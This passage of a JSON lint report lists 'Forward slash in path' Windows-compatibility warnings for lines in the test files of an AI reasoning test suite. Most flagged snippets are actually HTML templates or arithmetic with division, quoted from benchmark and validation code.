        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 462: Forward slash in path - ']}<br>\n                <strong>Suites Passed:</strong> {self.test_results['",
        "timestamp": "2025-09-05T17:30:42.226350"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 463: Forward slash in path - ']}<br>\n                <strong>Suites Failed:</strong> {self.test_results['",
        "timestamp": "2025-09-05T17:30:42.226366"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 464: Forward slash in path - ']}\n            </div>\n            \n            <h2>Test Suite Results</h2>\n            <table>\n                <tr>\n                    <th>Test Suite</th>\n                    <th>Status</th>\n                    <th>Success Rate</th>\n                    <th>Execution Time</th>\n                    <th>Total Tests</th>\n                    <th>Passed</th>\n                    <th>Failed</th>\n                </tr>\n        \"",
        "timestamp": "2025-09-05T17:30:42.226384"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 485: Forward slash in path - \">\n                    <td>{suite_name}</td>\n                    <td>{status_text}</td>\n                    <td>{result.get('",
        "timestamp": "2025-09-05T17:30:42.226404"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 488: Forward slash in path - ', 0):.1%}</td>\n                    <td>{result.get('",
        "timestamp": "2025-09-05T17:30:42.226418"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 489: Forward slash in path - ', 0):.1f}s</td>\n                    <td>{result.get('",
        "timestamp": "2025-09-05T17:30:42.226434"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 490: Forward slash in path - 'N/A'",
        "timestamp": "2025-09-05T17:30:42.226448"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 491: Forward slash in path - 'N/A'",
        "timestamp": "2025-09-05T17:30:42.226463"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 492: Forward slash in path - 'N/A'",
        "timestamp": "2025-09-05T17:30:42.226477"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 496: Forward slash in path - \"\n            </table>\n            \n            <h2>Target Assessment</h2>\n        \"",
        "timestamp": "2025-09-05T17:30:42.226494"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 507: Forward slash in path - \">\n                            <strong>{target_name}:</strong>\n                            <span class=\"",
        "timestamp": "2025-09-05T17:30:42.226515"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 512: Forward slash in path - '}\n                            </span>\n                        </div>\n                    \"",
        "timestamp": "2025-09-05T17:30:42.226533"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 517: Forward slash in path - \"\n            <h2>Recommendations</h2>\n            <ul>\n        \"",
        "timestamp": "2025-09-05T17:30:42.226549"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 523: Forward slash in path - \"<li>{recommendation}</li>\"",
        "timestamp": "2025-09-05T17:30:42.226566"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 525: Forward slash in path - \"\n            </ul>\n        </body>\n        </html>\n        \"",
        "timestamp": "2025-09-05T17:30:42.226581"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 531: Forward slash in path - \"test_reports/comprehensive_reasoning_test_report.html\"",
        "timestamp": "2025-09-05T17:30:42.226597"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\run_reasoning_tests.py",
        "warning": "Line 559: Forward slash in path - ']}/{target_summary['",
        "timestamp": "2025-09-05T17:30:42.226633"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 70: Forward slash in path - \"\n        interval = 1.0 / operations_per_second\n        timestamps = []\n        current_time = 0.0\n        \n        while current_time < duration_seconds:\n            timestamps.append(current_time)\n            current_time += interval\n        \n        return timestamps\n    \n    @staticmethod \n    def burst_load(burst_size: int, burst_interval: float, num_bursts: int) -> List[float]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.227341"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 98: Forward slash in path - \"\n        timestamps = []\n        current_time = 0.0\n        \n        while current_time < duration_seconds:\n            # Calculate current load based on ramp\n            progress = current_time / duration_seconds\n            current_ops = start_ops + (end_ops - start_ops) * progress\n            interval = 1.0 / max(current_ops, 0.1)\n            \n            timestamps.append(current_time)\n            current_time += interval\n        \n        return timestamps\n    \n    @staticmethod\n    def random_load(avg_ops_per_second: int, variance: float, duration_seconds: int) -> List[float]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.227394"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 115: Forward slash in path - \"\n        np.random.seed(42)\n        timestamps = []\n        current_time = 0.0\n        \n        while current_time < duration_seconds:\n            # Random interval based on exponential distribution\n            rate = max(0.1, np.random.normal(avg_ops_per_second, avg_ops_per_second * variance))\n            interval = np.random.exponential(1.0 / rate)\n            \n            current_time += interval\n            if current_time < duration_seconds:\n                timestamps.append(current_time)\n        \n        return sorted(timestamps)\n\n\nclass ResourceMonitor:\n    \"",
        "timestamp": "2025-09-05T17:30:42.227420"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 146: Forward slash in path - \"\n        self.monitoring = True\n        self.metrics = {key: [] for key in self.metrics.keys()}\n        \n        def monitor():\n            process = psutil.Process()\n            \n            while self.monitoring:\n                try:\n                    cpu = process.cpu_percent()\n                    memory_info = process.memory_info()\n                    memory_mb = memory_info.rss / 1024 / 1024\n                    memory_percent = process.memory_percent()\n                    \n                    self.metrics[\"",
        "timestamp": "2025-09-05T17:30:42.227455"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 204: Forward slash in path - \"\n        benchmarks = []\n        \n        # Test different data sizes\n        data_sizes = [100, 500, 1000, 2000]\n        \n        for size in data_sizes:\n            # Generate test data\n            np.random.seed(42)\n            n_features = min(10, max(5, size // 100))\n            \n            # Create causal data with known structure\n            data = self._generate_causal_benchmark_data(size, n_features)\n            \n            # Benchmark different discovery methods\n            methods = [\"",
        "timestamp": "2025-09-05T17:30:42.227525"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 222: Forward slash in path - \")\n                \n                # Warm-up run\n                await causal_engine.discover_causal_relationships(data.iloc[:50], discovery_method=method)\n                gc.collect()\n                \n                # Start monitoring\n                self.resource_monitor.start_monitoring()\n                \n                # Benchmark run\n                latencies = []\n                errors = 0\n                start_time = time.time()\n                \n                # Run multiple iterations for statistical significance\n                iterations = max(1, 50 // (size // 100))  # Fewer iterations for larger datasets\n                \n                for i in range(iterations):\n                    try:\n                        iter_start = time.time()\n                        \n                        result = await causal_engine.discover_causal_relationships(\n                            data,\n                            discovery_method=method\n                        )\n                        \n                        iter_time = time.time() - iter_start\n                        latencies.append(iter_time)\n                        \n                        # Validate result\n                        if not result or len(result.get_edge_list()) == 0:\n                            errors += 1\n                            \n                    except Exception as e:\n                        logger.warning(f\"",
        "timestamp": "2025-09-05T17:30:42.227572"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 266: Forward slash in path - \",\n                        throughput=len(latencies) / total_time,\n                        latency_mean=statistics.mean(latencies),\n                        latency_p50=statistics.median(latencies),\n                        latency_p95=np.percentile(latencies, 95),\n                        latency_p99=np.percentile(latencies, 99),\n                        memory_peak_mb=resource_metrics[\"",
        "timestamp": "2025-09-05T17:30:42.227608"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 274: Forward slash in path - \"],\n                        success_rate=(iterations - errors) / iterations,\n                        error_count=errors,\n                        concurrent_operations=1,\n                        total_operations=iterations,\n                        total_duration=total_time,\n                        additional_metrics={\n                            \"",
        "timestamp": "2025-09-05T17:30:42.227636"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 347: Forward slash in path - \"\n            ]\n            \n            retrieval_start = time.time()\n            \n            for query in queries * (size // 100 + 1):  # Scale queries with data size\n                try:\n                    iter_start = time.time()\n                    \n                    results = await working_memory.recall_memories(\n                        query=query,\n                        limit=min(20, size // 10)\n                    )\n                    \n                    retrieval_latencies.append(time.time() - iter_start)\n                    \n                    if not results:\n                        retrieval_errors += 1\n                        \n                except Exception as e:\n                    logger.warning(f\"",
        "timestamp": "2025-09-05T17:30:42.227704"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 376: Forward slash in path - \",\n                throughput=len(storage_latencies) / storage_time,\n                latency_mean=statistics.mean(storage_latencies),\n                latency_p50=statistics.median(storage_latencies),\n                latency_p95=np.percentile(storage_latencies, 95),\n                latency_p99=np.percentile(storage_latencies, 99),\n                memory_peak_mb=storage_resource_metrics[\"",
        "timestamp": "2025-09-05T17:30:42.227743"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 384: Forward slash in path - \"],\n                success_rate=(size - errors) / size,\n                error_count=errors,\n                concurrent_operations=1,\n                total_operations=size,\n                total_duration=storage_time,\n                additional_metrics={\n                    \"",
        "timestamp": "2025-09-05T17:30:42.227771"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 400: Forward slash in path - \",\n                throughput=len(retrieval_latencies) / retrieval_time,\n                latency_mean=statistics.mean(retrieval_latencies),\n                latency_p50=statistics.median(retrieval_latencies),\n                latency_p95=np.percentile(retrieval_latencies, 95),\n                latency_p99=np.percentile(retrieval_latencies, 99),\n                memory_peak_mb=retrieval_resource_metrics[\"",
        "timestamp": "2025-09-05T17:30:42.227796"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 408: Forward slash in path - \"],\n                success_rate=(len(retrieval_latencies) - retrieval_errors) / len(retrieval_latencies),\n                error_count=retrieval_errors,\n                concurrent_operations=1,\n                total_operations=len(retrieval_latencies),\n                total_duration=retrieval_time,\n                additional_metrics={\n                    \"",
        "timestamp": "2025-09-05T17:30:42.227816"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 515: Forward slash in path - \",\n                    throughput=size / ingestion_time if ingestion_success else 0,\n                    latency_mean=ingestion_time,\n                    latency_p50=ingestion_time,\n                    latency_p95=ingestion_time,\n                    latency_p99=ingestion_time,\n                    memory_peak_mb=ingestion_resource_metrics[\"",
        "timestamp": "2025-09-05T17:30:42.227890"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 538: Forward slash in path - \",\n                        throughput=len(pattern_latencies) / pattern_time,\n                        latency_mean=statistics.mean(pattern_latencies),\n                        latency_p50=statistics.median(pattern_latencies),\n                        latency_p95=np.percentile(pattern_latencies, 95),\n                        latency_p99=np.percentile(pattern_latencies, 99),\n                        memory_peak_mb=pattern_resource_metrics[\"",
        "timestamp": "2025-09-05T17:30:42.227921"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 546: Forward slash in path - \"],\n                        success_rate=(len(pattern_latencies) - pattern_errors) / len(pattern_latencies),\n                        error_count=pattern_errors,\n                        concurrent_operations=1,\n                        total_operations=len(pattern_latencies),\n                        total_duration=pattern_time,\n                        additional_metrics={\n                            \"",
        "timestamp": "2025-09-05T17:30:42.227943"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 564: Forward slash in path - \",\n                        throughput=len(prediction_latencies) / prediction_time,\n                        latency_mean=statistics.mean(prediction_latencies),\n                        latency_p50=statistics.median(prediction_latencies),\n                        latency_p95=np.percentile(prediction_latencies, 95),\n                        latency_p99=np.percentile(prediction_latencies, 99),\n                        memory_peak_mb=prediction_resource_metrics[\"",
        "timestamp": "2025-09-05T17:30:42.227974"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 572: Forward slash in path - \"],\n                        success_rate=(len(prediction_latencies) - prediction_errors) / len(prediction_latencies),\n                        error_count=prediction_errors,\n                        concurrent_operations=1,\n                        total_operations=len(prediction_latencies),\n                        total_duration=prediction_time,\n                        additional_metrics={\n                            \"",
        "timestamp": "2025-09-05T17:30:42.227998"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 660: Forward slash in path - \",\n                    throughput=len(latencies) / total_time,\n                    latency_mean=statistics.mean(latencies),\n                    latency_p50=statistics.median(latencies),\n                    latency_p95=np.percentile(latencies, 95),\n                    latency_p99=np.percentile(latencies, 99),\n                    memory_peak_mb=resource_metrics[\"",
        "timestamp": "2025-09-05T17:30:42.228072"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 668: Forward slash in path - \"],\n                    success_rate=len(latencies) / len(queries),\n                    error_count=errors,\n                    concurrent_operations=concurrency,\n                    total_operations=len(queries),\n                    total_duration=total_time,\n                    additional_metrics={\n                        \"",
        "timestamp": "2025-09-05T17:30:42.228105"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 738: Forward slash in path - \"\n        np.random.seed(42)\n        \n        start_time = datetime.now() - timedelta(hours=n_points)\n        temporal_data = []\n        \n        for i in range(n_points):\n            timestamp = start_time + timedelta(hours=i)\n            \n            # Generate value with trend, seasonality, and noise\n            trend = i * 0.01\n            seasonal = 5 * np.sin(2 * np.pi * i / 24)  # Daily pattern\n            noise = np.random.normal(0, 1)\n            \n            value = 50 + trend + seasonal + noise\n            \n            temporal_data.append({\n                \"",
        "timestamp": "2025-09-05T17:30:42.228166"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 815: Forward slash in path - \": sum(1 for r in self.results if r.latency_mean < 1.0) / len(self.results)\n            },\n            \"",
        "timestamp": "2025-09-05T17:30:42.228225"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 821: Forward slash in path - \": sum(1 for r in self.results if r.throughput >= 10.0) / len([r for r in self.results if r.throughput > 0]) if len([r for r in self.results if r.throughput > 0]) > 0 else 0\n            },\n            \"",
        "timestamp": "2025-09-05T17:30:42.228254"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 827: Forward slash in path - \": sum(1 for r in self.results if r.success_rate >= 0.95) / len(self.results)\n            }\n        }\n        \n        # Detailed results\n        detailed_results = [\n            {\n                \"",
        "timestamp": "2025-09-05T17:30:42.228281"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 875: Forward slash in path - ']:.1f} ops/sec)\"",
        "timestamp": "2025-09-05T17:30:42.228326"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 903: Forward slash in path - \"\n        try:\n            # Initialize systems\n            causal_engine = CausalReasoningEngine()\n            await causal_engine.initialize()\n            \n            working_memory = WorkingMemorySystem()\n            await working_memory.initialize()\n            \n            temporal_engine = TemporalReasoningEngine()\n            await temporal_engine.initialize()\n            \n            integrated_controller = IntegratedReasoningController(\n                causal_engine=causal_engine,\n                working_memory=working_memory,\n                temporal_engine=temporal_engine\n            )\n            await integrated_controller.initialize()\n            \n            # Run benchmark suite\n            benchmark_suite = ReasoningBenchmarkSuite()\n            \n            # Run individual system benchmarks\n            causal_benchmarks = await benchmark_suite.benchmark_causal_inference_performance(causal_engine)\n            memory_benchmarks = await benchmark_suite.benchmark_working_memory_performance(working_memory)\n            temporal_benchmarks = await benchmark_suite.benchmark_temporal_reasoning_performance(temporal_engine)\n            \n            # Run integrated system benchmarks\n            integration_benchmarks = await benchmark_suite.benchmark_integrated_reasoning_concurrency(integrated_controller)\n            \n            # Generate report\n            report = benchmark_suite.generate_benchmark_report()\n            \n            # Assertions\n            assert len(causal_benchmarks) >= 12  # Different methods x data sizes\n            assert len(memory_benchmarks) >= 8   # Storage/retrieval x data sizes  \n            assert len(temporal_benchmarks) >= 9  # Different operations x data sizes\n            assert len(integration_benchmarks) >= 4  # Different concurrency levels\n            \n            # Performance assertions\n            assert report[\"",
        "timestamp": "2025-09-05T17:30:42.228377"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_benchmarks.py",
        "warning": "Line 950: Forward slash in path - \"test_reports/benchmark_report.json\"",
        "timestamp": "2025-09-05T17:30:42.228405"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Line 77: Forward slash in path - ')\n        \n        # Trend component\n        trend = np.linspace(0, 10, n_points)\n        \n        # Seasonal component (daily pattern)\n        seasonal = 3 * np.sin(2 * np.pi * np.arange(n_points) / 24)\n        \n        # Random noise\n        noise = np.random.normal(0, 1, n_points)\n        \n        # Anomalies\n        anomaly_indices = np.random.choice(n_points, size=int(0.05 * n_points), replace=False)\n        anomalies = np.zeros(n_points)\n        anomalies[anomaly_indices] = np.random.normal(0, 5, len(anomaly_indices))\n        \n        values = trend + seasonal + noise + anomalies\n        \n        return pd.DataFrame({\n            '",
        "timestamp": "2025-09-05T17:30:42.229139"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Line 413: Forward slash in path - \"] < len(long_memories)  # Some memories should be consolidated/archived\n    \n    @pytest.mark.asyncio\n    async def test_hierarchical_organization(self, working_memory, memory_test_data):\n        \"",
        "timestamp": "2025-09-05T17:30:42.229297"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Line 583: Forward slash in path - ')\n        )\n        \n        # Detect anomalies\n        anomalies = await temporal_engine.detect_anomalies(\n            sensitivity=0.95\n        )\n        \n        assert len(anomalies) > 0\n        \n        # Should detect approximately 5% anomalies (as generated)\n        anomaly_rate = len(anomalies) / len(temporal_test_data)\n        assert 0.03 <= anomaly_rate <= 0.07  # 3-7% tolerance\n    \n    @pytest.mark.asyncio\n    async def test_multi_horizon_prediction(self, temporal_engine, temporal_test_data, test_config):\n        \"",
        "timestamp": "2025-09-05T17:30:42.229399"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Line 1016: Forward slash in path - \"\n            )\n            tasks.append(task)\n        \n        results = await asyncio.gather(*tasks, return_exceptions=True)\n        \n        execution_time = time.time() - start_time\n        \n        # Most requests should complete successfully\n        successful_results = [r for r in results if not isinstance(r, Exception)]\n        success_rate = len(successful_results) / len(concurrent_queries)\n        \n        assert success_rate >= 0.8  # At least 80% success rate\n        \n        # Should handle load efficiently\n        avg_time_per_query = execution_time / len(concurrent_queries)\n        assert avg_time_per_query < 5.0  # Average less than 5 seconds per query\n    \n    @pytest.mark.asyncio\n    async def test_memory_and_learning_integration(self, integrated_controller):\n        \"",
        "timestamp": "2025-09-05T17:30:42.229643"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_systems.py",
        "warning": "Line 1175: Forward slash in path - \"--cov-report=html:test_reports/reasoning_coverage\"",
        "timestamp": "2025-09-05T17:30:42.229768"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
        "warning": "Line 132: Forward slash in path - \"\n        })\n        \n        # Seasonal pattern (daily)\n        hours = np.arange(n) % 24\n        seasonal_values = 10 + 5 * np.sin(2 * np.pi * hours / 24) + np.random.normal(0, 1, n)\n        \n        datasets.append({\n            \"",
        "timestamp": "2025-09-05T17:30:42.230194"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
        "warning": "Line 147: Forward slash in path - \"\n        })\n        \n        # Trend + Seasonality + Anomalies\n        trend_seasonal = np.linspace(5, 25, n) + 3 * np.sin(2 * np.pi * hours / 24)\n        \n        # Add specific anomalies\n        anomaly_indices = [100, 300, 600, 800]\n        anomaly_values = trend_seasonal.copy()\n        for idx in anomaly_indices:\n            if idx < len(anomaly_values):\n                anomaly_values[idx] += np.random.choice([-15, 15])  # Extreme outliers\n        \n        anomaly_values += np.random.normal(0, 1, n)  # Background noise\n        \n        datasets.append({\n            \"",
        "timestamp": "2025-09-05T17:30:42.230219"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
        "warning": "Line 473: Forward slash in path - ']))\n        \n        ground_truth_set = set(ground_truth)\n        \n        # Calculate metrics\n        true_positives = len(discovered_set.intersection(ground_truth_set))\n        false_positives = len(discovered_set - ground_truth_set)\n        false_negatives = len(ground_truth_set - discovered_set)\n        \n        precision = true_positives / (true_positives + false_positives) if (true_positives + false_positives) > 0 else 0\n        recall = true_positives / (true_positives + false_negatives) if (true_positives + false_negatives) > 0 else 0\n        f1 = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0\n        \n        # Accuracy as F1 score for causal discovery\n        accuracy = f1\n        \n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.230406"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
        "warning": "Line 525: Forward slash in path - \", 0)\n        detected_count = len(anomalies)\n        \n        if expected_anomalies == 0:\n            anomaly_score = 1.0 if detected_count == 0 else max(0, 1.0 - detected_count * 0.1)\n        else:\n            # Tolerance for anomaly detection (±20%)\n            tolerance = max(1, expected_anomalies * 0.2)\n            if abs(detected_count - expected_anomalies) <= tolerance:\n                anomaly_score = 1.0\n            else:\n                anomaly_score = max(0, 1.0 - abs(detected_count - expected_anomalies) / expected_anomalies)\n        \n        scores.append(anomaly_score)\n        \n        # Overall accuracy\n        accuracy = np.mean(scores)\n        \n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.230459"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
        "warning": "Line 565: Forward slash in path - \"]).lower()\n            # Simple keyword matching (in practice would use semantic similarity)\n            keyword_matches = sum(1 for word in gt_solution.split() if word in solution_text)\n            keyword_score = min(1.0, keyword_matches / len(gt_solution.split()))\n            scores.append(keyword_score)\n        \n        # Check reasoning quality\n        if hasattr(solution, '",
        "timestamp": "2025-09-05T17:30:42.230491"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
        "warning": "Line 572: Forward slash in path - ') and solution.reasoning_path:\n            reasoning_quality = min(1.0, len(solution.reasoning_path) / 3)  # Expect at least 3 reasoning steps\n            scores.append(reasoning_quality)\n        else:\n            scores.append(0.0)\n        \n        # Check confidence alignment\n        if hasattr(solution, '",
        "timestamp": "2025-09-05T17:30:42.230512"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
        "warning": "Line 607: Forward slash in path - \", []))\n            \n            if expected_systems:\n                system_coverage = len(systems_used.intersection(expected_systems)) / len(expected_systems)\n            else:\n                system_coverage = 1.0 if len(systems_used) > 1 else 0.5\n            \n            scores.append(system_coverage)\n        else:\n            scores.append(0.0)\n        \n        # Check answer quality (simplified)\n        if result and result.final_answer:\n            answer_length_score = min(1.0, len(result.final_answer.split()) / 50)  # Expect substantial answers\n            scores.append(answer_length_score)\n        else:\n            scores.append(0.0)\n        \n        # Check coherence (simplified)\n        if hasattr(result, '",
        "timestamp": "2025-09-05T17:30:42.230553"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
        "warning": "Line 667: Forward slash in path - \": passed_tests / len(results),\n                \"",
        "timestamp": "2025-09-05T17:30:42.230593"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
        "warning": "Line 784: Forward slash in path - \"test_reports/validation_report.json\"",
        "timestamp": "2025-09-05T17:30:42.230691"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\__init__.py",
        "warning": "Line 4: Forward slash in path - \"\n\nfrom pathlib import Path\n\n# Test configuration\nTEST_DIR = Path(__file__).parent\nREPORTS_DIR = TEST_DIR.parent / \"",
